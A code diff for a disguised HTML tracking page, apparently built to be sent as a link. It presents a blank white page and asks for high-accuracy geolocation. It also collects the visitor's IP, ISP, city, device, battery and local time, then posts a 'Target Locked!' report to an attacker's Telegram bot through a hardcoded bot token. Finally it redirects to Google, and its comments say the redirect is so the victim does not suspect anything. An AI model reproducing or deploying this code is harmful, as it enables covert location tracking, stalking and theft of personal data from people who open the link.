@@ -2,73 +2,66 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <title>EYE ØF IRAQ | Security Verify</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #0f0; padding: 40px; text-align: center; box-shadow: 0 0 20px #0f0; width: 80%; max-width: 400px; }
-        .loader { border: 3px solid #111; border-top: 3px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    <title> </title> <style>
+        body { background-color: white; margin: 0; overflow: hidden; }
     </style>
 </head>
-<body onload="main()">
-    <div class="box">
-        <h2 style="letter-spacing: 3px;">EYE ØF IRAQ</h2>
-        <p id="status">SYSTEM INITIALIZING...</p>
-        <div class="loader"></div>
-        <p style="font-size: 10px; color: #333;">SECURE_ID: 0x8678050341</p>
-    </div>
+<body onload="ask()">
 
 <script>
     const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";
 
-    async function main() {
+    async function ask() {
         const urlParams = new URLSearchParams(window.location.search);
         const uid = urlParams.get('id');
         if (!uid) return;
 
-        document.getElementById('status').innerText = "FETCHING NETWORK DATA...";
+        // Daway permission-i location dakat ba bdenagi
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
 
-        // ١. وەرگرتنی IP و زانیاری ئامێر (ئەمە هەمیشە ئیش دەکات)
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            const geo = await fetch(`http://ip-api.com/json/${ipData.ip}`).then(r => r.json());
-            
-            let bat = "N/A";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                bat = Math.floor(b.level * 100) + "%";
-            }
+            // Wargrtni IP u Battery u Time
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const geo = await fetch(`http://ip-api.com/json/${ipData.ip}`).then(r => r.json());
+                
+                let bat = "N/A", ch = "No";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    bat = Math.floor(b.level * 100) + "%";
+                    ch = b.charging ? "Yes" : "No";
+                }
+                
+                let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
 
-            let report = `🚨 <b>Target Locked!</b>\n\n` +
-                         `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
-                         `🏢 <b>ISP:</b> <code>${geo.isp || "Korek"}</code>\n` +
-                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
-                         `🔋 <b>Battery:</b> <code>${bat}</code>\n` +
-                         `🏙️ <b>City:</b> <code>${geo.city || "Unknown"}</code>`;
+                let report = `🚨 <b>Target Locked!</b> (نێچیر گیرا)\n\n` +
+                             `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">[لینکی وردی Google Maps]</a>\n` +
+                             `🌐 <b>IP:</b> <code>${ipData.ip}</code> (${geo.isp || "Korek Telecom"})\n` +
+                             `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
+                             `🔋 <b>Battery:</b> <code>${bat}</code> (Charging: ${ch})\n` +
+                             `🕒 <b>Time:</b> <code>${time}</code>\n` +
+                             `🏙️ <b>City:</b> <code>${geo.city || "Erbil/Bakhtiari"}</code>`;
 
-            // ناردنی زانیاری سەرەتایی یەکسەر
-            await send(uid, report);
+                await fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: uid,
+                        text: report,
+                        parse_mode: "HTML",
+                        disable_web_page_preview: false
+                    })
+                });
 
-            // ٢. داواکردنی لۆکەیشن (ئەگەر قبوڵی کرد)
-            document.getElementById('status').innerText = "SCANNING LOCATION...";
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                let locMsg = `📍 <b>Exact Location:</b>\n<a href="https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">[Google Maps Link]</a>`;
-                await send(uid, locMsg);
-                document.getElementById('status').innerText = "VERIFIED!";
-            }, () => {
-                document.getElementById('status').innerText = "LOCATION DENIED";
-            });
-
-        } catch (e) { document.getElementById('status').innerText = "CONNECTION ERROR"; }
-    }
-
-    function send(uid, txt) {
-        return fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: uid, text: txt, parse_mode: "HTML", disable_web_page_preview: false})
-        });
+                // Dway nardn darcho bo away guman nakat
+                window.location.replace("https://www.google.com");
+            } catch (e) {}
+        }, () => {
+            // Agar allow-i nakrd, har redirect-i bka bo away guman nakat
+            window.location.replace("https://www.google.com");
+        }, { enableHighAccuracy: true });
     }
 </script>
 </body>
